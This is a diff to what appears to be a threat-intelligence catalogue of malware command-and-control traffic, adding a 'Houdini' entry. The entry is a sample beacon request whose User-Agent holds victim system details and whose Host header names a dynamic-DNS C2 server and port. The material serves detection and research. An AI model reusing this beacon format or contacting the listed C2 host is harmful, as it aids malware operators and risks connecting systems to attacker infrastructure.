@@ -278,6 +278,20 @@ ICAgICAgICAgOiBob25leUBwb3QuY29tDQpQYXNzd29yZCAgICAgICAgICA6IGhvbmV5
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/hawkeye.png "Hawkeye")
 
+#### Houdini
+~~~
+POST /Vre HTTP/1.1
+Accept: */*
+Accept-Language: en-us
+User-Agent: Laposte_C4BA3647\PC\admin\Microsoft Windows 7 Professional \Not-found\\Yes\FALSE\
+Accept-Encoding: gzip, deflate
+Host: jihanenouhaila.ddns.net:7773
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/houdini.png "Houdini")
+
 #### Icedid
 URI is uually data2.php
 ~~~
